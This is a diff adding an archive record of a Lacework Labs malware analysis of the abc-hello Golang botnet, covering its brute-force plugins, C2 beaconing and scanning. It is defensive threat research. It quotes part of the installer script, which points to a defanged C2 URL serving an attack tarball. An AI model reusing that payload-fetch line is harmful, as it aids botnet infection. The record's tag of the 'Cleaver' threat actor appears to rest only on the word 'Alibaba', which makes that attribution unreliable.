@@ -1,0 +1,63 @@
+{
+    "id": "b0df5893-9d36-4603-9ba4-d26f56f5c0fc",
+    "created_at": "2023-01-12T15:07:51.792496Z",
+    "updated_at": "2025-03-27T02:14:34.200949Z",
+    "deleted_at": null,
+    "sha1_hash": "27199de43528138443b9e74b375a0a8c4a24fcae",
+    "title": "2021-12-02 - ABC Botnet Attacks on the Rise",
+    "authors": "",
+    "file_creation_date": "2022-05-28T05:01:49Z",
+    "file_modification_date": "2022-05-28T05:01:49Z",
+    "file_size": 502346,
+    "plain_text": "# ABC Botnet Attacks on the Rise\n\n**lacework.com/blog/abc-botnet-attacks-on-the-rise/**\n\n## Key Takeaways\n\n\nDecember 2, 2021\n\n\nThe “abc-hello” DDoS botnet and malware is propagating in the wild via exploits and\nbrute force attempts\nThe malware is a Golang application with a modular plugin structure.\nAnalysis exposed related malware development on Github\nIndicators and tools are provided\n\nThe use of Golang malware has considerably increased in recent years and this trend is\nespecially obvious in cloud based attacks. There are several reasons for this including\nGolang’s easy cross-platform compilation, relatively low detection ratios, and a powerful\nnetworking stack. The last reason makes it an excellent choice for brute forcers as these are\ninherently network intensive. Lacework Labs recently observed one of these aggressive Go\nbrute force applications in honeypot traffic. This malware and botnet, dubbed “abc-hello”\nleverages a Weblogic exploit (CVE) and different modules for brute forcing SSH, Redis,\nPostgreSQL.\n\nAnalysis of honeypot data revealed abc-hello was responsible for the majority of WebLogic\nexploit attempts over a four month period. All traffic sources were from China suggesting the\nbotnet to have more success infecting servers hosted with Chinese cloud providers. Static\n\n\n-----\n\nanalysis of abc-hello identified key plugins and libraries for the malware. The plugins,which\nall have ‘abc-hello’ in the path, include scanning and brute force modules. The web logic\nmodule, plugin.Weblogic14882Check, references the applicable CVE 2021-14882.\n\nabc-hello/plugin.SetConfig\nabc-hello/plugin.Scan\nabc-hello/plugin.try\nabc-hello/plugin.pluginRun.func2\nabc-hello/plugin/plugin.go\nabc-hello/plugin.Regist\nabc-hello/plugin.SshPassCheck\nabc-hello/plugin.try.func1\nabc-hello/plugin.PostgresPassCheck\nabc-hello/plugin.pluginRun\nabc-hello/plugin.RedisPassCheck\nabc-hello/plugin.Check\nabc-hello/plugin.CheckErrs\nabc-hello/plugin.StartScan\nabc-hello/plugin.pluginRun.func1\nabc-hello/plugin.Weblogic14882Check\nabc-hello/plugin.init.0\nabc-hello/plugin.StartScan.func1\n\nAbc-hello’s botnet propagates via brute forcing and the Weblogic exploit. The first stage\nmalware is a malicious bash installer named ff.sh. This script is similar to many others that\nattempt to find and uninstall malware components such as XMRig processes and containers\nfrom preexisting infections. Primary tasks include installation of the abc-hello payload,\nconfiguration of a user named ‘logger’, and copying of SSH keys. One distinguishing feature\n[from this install script is a comment referencing cloudResetPwdUpdateAgent. This is a](https://github.com/Huawei/CloudResetPwdAgent)\nHuwaii cloud utility for password resetting under OpenStack architecture.\n\nThe ff.sh script writes Abc-hello to /etc/iptablesupdate. During testing, the abc-hello runs a\ncopy of itself as /usr/bin/dockerlogger. The malware was alerted to by Lacework and the\nPolygraph gave insight into the brute forcing capabilities. (Figure 1).\n\n\n-----\n\nFigure 1. abc-hello/Dockerlogger as seen by Lacework\n\n## Traffic & Protocol Analysis\n\nLacework Labs examined packet capture which contained just 16 minutes of abc-hello traffic.\nWithin that time frame the malware attempted connections to over 74K IPs amounting to 423\nmegabytes. The malware first connects on port 26800 to the c2 which is the same server as\nthe malware host. The check-in transmits basic information about the victim in plaintext.\n\nFigure 2 . abc-hello C2 checkin-in\n\nFollow on beacons occur in 5 second intervals and consist of a POST to /api/getlist. The c2\nreplied with two hex ascii values. The first value 73746f707c decodes to stop|. The second\nvalue is a digital signature used for verification.\n\n\n-----\n\nFigure 3. abc-hello C2 instructions\n\nThe first subnet to be scanned is the class B of the victim’s private subnet (in this case\n172.31.0.0/16). The program then proceeds to randomly generate public class B networks\n(255.255.0.0) and then scans the entire subnet. Among the 74K contacted hosts, 2354 were\nlistening on targeted ports. (This is provided for context and extrapolation and would vary\ndepending on generated subnets)\n\nTargeted Port Service Listening Hosts\n\n22 SSH 2271\n\n5432 PostgreSQL 467\n\n6379 Redis 439\n\n7001 Weblogic 422\n\nFigure 4. Exploits & brute forcing\n\n## Kdev Kernel Module & Millken\n\n\n-----\n\nOne variant of the abc-hello installer also installed a kernel module with apparent scanning\nand DDoS functionality. Searches on this module revealed the same code in a Github\n[repository named kdev. While this is open source, the repository only has 2 forks indicating](https://github.com/millken/kdev)\nlimited distribution. The module creator, millken, has been quite active since 2013 with over\n140 repositories; however very few have any useful documentation or READMEs. Ten\npercent of millken’s code is also Golang but it’s unclear if any comprise the source for the\n[abc-hello Golang component. The user did author a Golang scanner named kscan and has](https://github.com/millken/kscan)\nalso forked numerous scanning and hacking associated repositories from others. The kscan\n[repo also has a test configuration file with three class C’s belonging to ASN 37963](https://github.com/millken/kscan/blob/master/test/ip.txt)\n(Hangzhou Alibaba Advertising Co.,Ltd.) which was the top source for abc-hello traffic\nobserved in the Lacework Labs honeypots.\n```\n#!/bin/sh\nxl_x64scan1=\"http://103[.]209.103.16:26800/atk.tar.gz\"\nxl_x64scan2=\"http://103[.]209.103.16:26800/atk.tar.gz\"\nif [ -x \"$(command -v apt-get)\" ]; then\nexport DEBIAN_FRONTEND=noninteractive\napt-get install -y debconf-doc\napt-get install -y build-essential\napt-get install -y make gcc git\nfi\n…\n\n```\n[Netlab reported that this DDoS module was later scrapped and follow-on variants of abc-](https://blog.netlab.360.com/abcbot_an_evolving_botnet_en/)\nhello are bundled with modules for similar functionality.\nWhile more evidence would be needed to attribute the millken user to actual abc-hello botnet\noperations, the related repositories and code-base is worth noting.\n\n## Conclusion\n\nAbc-hello is not the most prolific botnet in the wild, however Lacework Labs has consistently\nobserved related traffic in our honeypots. For Weblogic exploit attempts specifically, the\n[botnet ranks among the most aggressive. Additionally, as highlighted by Netlab, the malware](https://blog.netlab.360.com/abcbot_an_evolving_botnet_en/)\nwill likely evolve as there are indications that the operators are still in the testing phase for\nother components such as DGA and TOR.\n\nThe use of Golang has become typical among many brute force applications and it will likely\ncontinue to be a popular choice for botnets like abc-hello. As part of this analysis Lacework\n[Labs authored a Go triage tool that can assist in identifying strings of interest and gleaning](https://github.com/lw-chall/go_analyzer)\n[insight into a program’s functionality. This tool as well as indicators are available in the](https://github.com/lacework/lacework-labs/blob/master/blog/abc-hello_indicators.csv)\n[Lacework Labs’ Github repository. Be sure to follow Lacework Labs on LinkedIn,](https://www.linkedin.com/showcase/lacework-labs) [Twitter, and](https://www.twitter.com/LaceworkLabs)\n[YouTube to stay up-to-date on our latest research.](https://www.youtube.com/channel/UCiNTyM12-6o5C6d8zqr4DMA)\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-02 - ABC Botnet Attacks on the Rise.pdf"
+    ],
+    "report_names": [
+        "2021-12-02 - ABC Botnet Attacks on the Rise.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
+            "created_at": "2023-01-06T13:46:38.376868Z",
+            "updated_at": "2025-03-27T02:00:02.818071Z",
+            "deleted_at": null,
+            "main_name": "Cleaver",
+            "aliases": [
+                "Cobalt Gypsy",
+                "G0003",
+                "Operation Cleaver",
+                "Op Cleaver",
+                "Tarh Andishan",
+                "Alibaba",
+                "TG-2889"
+            ],
+            "source_name": "MISPGALAXY:Cleaver",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536071,
+    "ts_updated_at": 1743041674,
+    "ts_creation_date": 1653714109,
+    "ts_modification_date": 1653714109,
+    "files": {
+        "pdf": "https://archive.orkl.eu/27199de43528138443b9e74b375a0a8c4a24fcae.pdf",
+        "text": "https://archive.orkl.eu/27199de43528138443b9e74b375a0a8c4a24fcae.txt",
+        "img": "https://archive.orkl.eu/27199de43528138443b9e74b375a0a8c4a24fcae.jpg"
+    }
+}
